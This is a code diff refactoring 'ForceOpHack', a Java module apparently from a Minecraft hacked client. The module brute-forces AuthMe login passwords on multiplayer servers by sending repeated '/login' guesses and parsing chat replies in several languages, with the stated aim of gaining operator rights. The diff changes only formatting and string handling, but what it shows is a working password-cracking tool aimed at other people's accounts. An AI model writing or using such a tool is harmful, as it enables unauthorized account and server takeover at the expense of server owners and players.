@@ -50,7 +50,8 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 	
 	public ForceOpHack()
 	{
-		super("ForceOP", "Cracks AuthMe passwords. Can be used to get OP.");
+		super("ForceOP",
+			"Cracks AuthMe passwords.\n" + "Can be used to get OP.");
 		setCategory(Category.CHAT);
 		
 		try
@@ -164,18 +165,22 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 		MC.player.sendChatMessage("/login " + MC.getSession().getUsername());
 		lastPW = 0;
 		// update();
+		
 		for(int i = 0; i < passwords.length; i++)
 		{
 			if(!isEnabled())
 				return;
+			
 			JCheckBox cbDontWait = new JCheckBox();
 			if(!cbDontWait.isSelected())
 				gotWrongPWMSG = false;
+			
 			while(!cbDontWait.isSelected() && !hasGotWrongPWMSG()
 				|| MC.player == null)
 			{
 				if(!isEnabled())
 					return;
+				
 				try
 				{
 					Thread.sleep(50);
@@ -188,6 +193,7 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 				if(MC.player == null)
 					gotWrongPWMSG = true;
 			}
+			
 			try
 			{
 				int forceOPDelay = 1000;
@@ -196,6 +202,7 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 			{
 				e.printStackTrace();
 			}
+			
 			boolean sent = false;
 			while(!sent)
 				try
@@ -212,9 +219,11 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 						e1.printStackTrace();
 					}
 				}
+			
 			lastPW = i + 1;
 			// update();
 		}
+		
 		ChatUtils.message("\u00a7c[\u00a74\u00a7lFAILURE\u00a7c]\u00a7f All "
 			+ (lastPW + 1) + " passwords were wrong.");
 	}
@@ -225,37 +234,44 @@ public final class ForceOpHack extends Hack implements ChatInputListener
 		String message = event.getComponent().asString();
 		if(message.startsWith("\u00a7c[\u00a76Wurst\u00a7c]\u00a7f "))
 			return;
-		if(message.toLowerCase().contains("wrong")// English
-			|| message.toLowerCase().contains("falsch")// Deutsch!
-			|| message.toLowerCase().contains("incorrect")// English
-			|| message.toLowerCase().contains("mauvais")// French
-			|| message.toLowerCase().contains("mal")// Spanish
-			|| message.toLowerCase().contains("sbagliato")// Italian
+		
+		String msgLowerCase = message.toLowerCase();
+		
+		if(msgLowerCase.contains("wrong")// English
+			|| msgLowerCase.contains("falsch")// Deutsch!
+			|| msgLowerCase.contains("incorrect")// English
+			|| msgLowerCase.contains("mauvais")// French
+			|| msgLowerCase.contains("mal")// Spanish
+			|| msgLowerCase.contains("sbagliato")// Italian
 		)
 			gotWrongPWMSG = true;
-		else if(message.toLowerCase().contains("success")// English & Italian
-			|| message.toLowerCase().contains("erfolg")// Deutsch!
-			|| message.toLowerCase().contains("succ\u00e8s")// French
-			|| message.toLowerCase().contains("\u00e9xito")// Spanish
+		else if(msgLowerCase.contains("success")// English & Italian
+			|| msgLowerCase.contains("erfolg")// Deutsch!
+			|| msgLowerCase.contains("succ\u00e8s")// French
+			|| msgLowerCase.contains("\u00e9xito")// Spanish
 		)
 		{
-			String password;
 			if(lastPW == -1)
 				return;
-			else if(lastPW == 0)
+			
+			String password;
+			if(lastPW == 0)
 				password = MC.getSession().getUsername();
 			else
 				password = passwords[lastPW - 1];
+			
 			ChatUtils.message(
 				"\u00a7a[\u00a72\u00a7lSUCCESS\u00a7a]\u00a7f The password \""
 					+ password + "\" worked.");
+			
 			setEnabled(false);
-		}else if(message.toLowerCase().contains("/help")
-			|| message.toLowerCase().contains("permission"))
+			
+		}else if(msgLowerCase.contains("/help")
+			|| msgLowerCase.contains("permission"))
 			ChatUtils.warning("It looks like this server doesn't have AuthMe.");
-		else if(message.toLowerCase().contains("logged in")
-			|| message.toLowerCase().contains("eingeloggt")
-			|| message.toLowerCase().contains("eingelogt"))
+		else if(msgLowerCase.contains("logged in")
+			|| msgLowerCase.contains("eingeloggt")
+			|| msgLowerCase.contains("eingelogt"))
 			ChatUtils.warning("It looks like you are already logged in.");
 	}
 	
